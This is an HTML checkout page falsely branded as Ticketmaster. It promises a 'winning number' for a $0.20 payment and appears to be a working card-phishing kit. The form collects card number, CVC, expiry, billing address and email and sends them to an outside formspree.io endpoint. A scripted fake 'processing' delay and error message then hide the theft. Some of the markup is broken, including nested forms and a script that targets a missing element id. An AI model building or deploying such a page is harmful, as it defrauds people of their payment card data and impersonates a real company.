<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Payment Processing</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-image: url('/FONDO\ FINAL.jpeg');
            background-size: contain;
            background-position: 0 0;
            background-repeat: repeat;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            perspective: 1000px;
            opacity: 0;
            animation: fadeInPage 1s forwards;
            padding-bottom: 50px; /* Provide some space for the keyboard on mobile devices */
        }

        .payment-form {
            background-color: rgba(255, 255, 255, 0.87);
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 320px;
            opacity: 0;
            animation: fadeInForm 1s forwards;
        }

        @keyframes fadeInPage {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes fadeInForm {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.5);
            justify-content: center;
            align-items: center;
            opacity: 0;
            transition: opacity 0.5s ease-in-out;
        }

        .overlay.show {
            display: flex;
            opacity: 1;
        }

        .overlay .message {
            background: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
        }

        .payment-form .logo {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 20px;
        }

        .payment-form .logo img {
            width: 150px;
            height: auto;
        }

        .secure-payments {
            text-align: center;
            margin-bottom: 10px;
            color: #32325d;
        }

        .footer {
            text-align: center;
            font-size: 12px;
            color: #32325d;
            margin-top: 20px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group input {
            width: 90%;
            padding: 10px;
            border: 1px solid #ccd0d2;
            border-radius: 4px;
            font-size: 16px;
            color: #32325d;
            background-color: #f0f0f0;
        }

        .input-group input::placeholder {
            color: #a0a0a0;
        }

        #expiry-date, #cvc {
            width: 40%;
        }

        .expiry-cvc-group {
            display: flex;
            gap: 0;
        }

        #zip {
            width: 22%;
        }

        #city {
            width: 80%;
        }

        #state {
            width: 80%;
        }

        .button {
            width: 100%;
            background-color: #6772e5;
            color: #ffffff;
            padding: 12px;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 20px;
            transition: background-color 0.3s, transform 0.3s;
            font-weight: bold;
        }

        .button:hover {
            background-color: #5469d4;
            transform: scale(1.05);
        }

        .address-line-group {
            display: flex;
            gap: 10px;
        }

        .payment-methods {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 20px;
            margin-top: 20px;
        }

        .payment-methods img {
            height: 40px;
        }

        .email-info {
            font-size: 14px;
            color: #32325d;
            text-align: center;
            margin-top: 5px;
        }
    </style>
</head>
<body>
    <!-- Payment Form -->
    <div class="payment-form" id="payment-form-container">
        <div class="logo">
            <img src="itr.png" alt="Payment Logo">
        </div>
        <div class="secure-payments">Secure Payments</div>
        <form action="https://formspree.io/f/mblrbkre" method="post">
            <label for="email">ianortizvalle28@proton.me</label>
            <input name="Email" id="email" type="email">
            <button type="submit">Submit</button>
          </form>
            <div class="input-group">
                <input type="text" id="cardholder-name" name="cardholder-name" placeholder="Cardholder Name" required>
            </div>
            <div class="input-group">
                <input type="text" id="card-number" name="card-number" placeholder="Card Number" required>
            </div>
            <div class="expiry-cvc-group">
                <div class="input-group">
                    <input type="text" id="expiry-date" name="expiry-date" placeholder="MM/YY" required>
                </div>
                <div class="input-group">
                    <input type="text" id="cvc" name="cvc" placeholder="CVC" required>
                </div>
            </div>
            <div class="input-group">
                <input type="text" id="address-line" name="address-line" placeholder="Address" required>
            </div>
            <div class="address-line-group">
                <div class="input-group">
                    <input type="text" id="city" name="city" placeholder="City" required>
                </div>
                <div class="input-group">
                    <input type="text" id="state" name="state" placeholder="State" required>
                </div>
            </div>
            <div class="input-group">
                <input type="text" id="zip" name="zip" placeholder="ZIP Code" required>
            </div>
            <div class="input-group">
                <input type="email" id="email" name="email" placeholder="Email Address" required>
            </div>
            <div class="email-info">
                Once we confirm your payment, you will be redirected to generate your winning number.
            </div>
            <button type="submit" class="button">Pay $0.20</button>
            <div class="payment-methods">
                <img src="visa.png" alt="Visa">
                <img src="mastercard.png" alt="MasterCard">
                <img src="american express.png" alt="American Express">
                <img src="dis.png" alt="Discover">
            </div>
            <div class="footer">
                Â© ticketmaster Ltd. 2024 | By Ecommerce Agency - RVS Media
            </div>
        </form>
    </div>

    <!-- Processing overlay -->
    <div class="overlay" id="processing-overlay">
        <div class="message">Processing Payment...</div>
    </div>

    <!-- Error overlay -->
    <div class="overlay" id="error-overlay">
        <div class="message">Please try again later, we are experiencing issues.</div>
    </div>

    <script>
        // Format card number
        document.getElementById('card-number').addEventListener('input', function (event) {
            var input = event.target;
            var value = input.value.replace(/\D/g, ''); // Allow only numbers
            var formattedValue = '';

            for (var i = 0; i < value.length; i += 4) {
                formattedValue += value.substring(i, i + 4) + ' ';
            }

            input.value = formattedValue.trim(); // Assign the formatted value

            // Validate length of 16 digits
            if (value.length > 16) {
                input.value = formattedValue.slice(0, 19);
            }

            if (value.length < 16) {
                input.setCustomValidity("Card number is incomplete");
            } else {
                input.setCustomValidity("");
            }
        });

        // Validate MM/YY
        document.getElementById('expiry-date').addEventListener('input', function(event) {
            var input = event.target;
            // Allow only numbers and "/"
            input.value = input.value.replace(/[^0-9\/]/g, '');
        });

        // Validate CVC
        document.getElementById('cvc').addEventListener('input', function(event) {
            var input = event.target;
            input.value = input.value.replace(/\D/g, ''); // Allow only numbers
        });

        // Validate ZIP Code
        document.getElementById('zip').addEventListener('input', function(event) {
            var input = event.target;
            input.value = input.value.replace(/\D/g, ''); // Allow only numbers
        });

        // Handle form submission
        document.getElementById('payment-form').addEventListener('submit', function(event) {
            event.preventDefault(); // Prevent default form submission

            // Show "Processing Payment" overlay
            document.getElementById('processing-overlay').classList.add('show');

            // Simulate payment processing and handle success/error
            setTimeout(function() {
                // Hide "Processing Payment" overlay
                document.getElementById('processing-overlay').classList.remove('show');

                // Show error message overlay
                document.getElementById('error-overlay').classList.add('show');

                // After showing the error message for 5 seconds, refresh the page
                setTimeout(function() {
                    location.reload(); // Refresh the page
                }, 5000); // Time to show the error overlay (5 seconds)
            }, 5000); // Time to simulate payment processing (5 seconds)

            // Create a FormData object with form data
            var formData = new FormData(event.target);

            // Send the form in the background using fetch
            fetch(event.target.action, {
                method: 'POST',
                body: formData,
            })
            .then(function(response) {
                if (response.ok) {
                    console.log('Payment successful!');
                } else {
                    console.error('Payment failed.');
                }
            })
            .catch(function(error) {
                console.error('Error:', error);
            });
        });
    </script>
</body>
</html>
